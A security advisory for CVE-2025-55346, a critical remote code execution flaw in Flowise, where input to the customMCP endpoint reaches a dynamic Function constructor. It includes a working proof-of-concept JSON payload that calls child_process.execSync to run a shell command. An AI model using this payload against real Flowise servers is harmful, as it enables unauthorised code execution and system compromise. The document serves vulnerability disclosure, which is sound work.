---
description: CVE-2025-55346, CRITICAL, Flowise JS injection remote code execution
title: Flowise JS injection remote code execution
date_published: "2025-08-14"
last_updated: "2025-08-14"
xray_id: JFSA-2025-001379925
vul_id: CVE-2025-55346
cvss: 9.8
severity: critical
discovered_by: Assaf Levkovich 
type: vulnerability

---

## Summary

Unintended dynamic code execution leads to remote code execution by network attackers

## Component

[flowise](https://www.npmjs.com/package/flowise?activeTab=code)

## Affected versions

(,)

## Description

User-controlled input flows to an unsafe implementation of a dynamic Function constructor, allowing network attackers to run arbitrary unsandboxed JS code in the context of the host, by sending a simple POST request. Depending on the version of Flowise this could lead to either unauthenticated or authenticated remote code execution.


## PoC

Send the following payload to the `node-load-method/customMCP` API endpoint -

```json
{
    "inputs":
    {
        "mcpServerConfig": "(global.process.mainModule.require('child_process').execSync('touch /tmp/foo'))"
    },
    "loadMethod": "listActions"
}
```





## Vulnerability Mitigations

No mitigations are supplied for this issue



## References



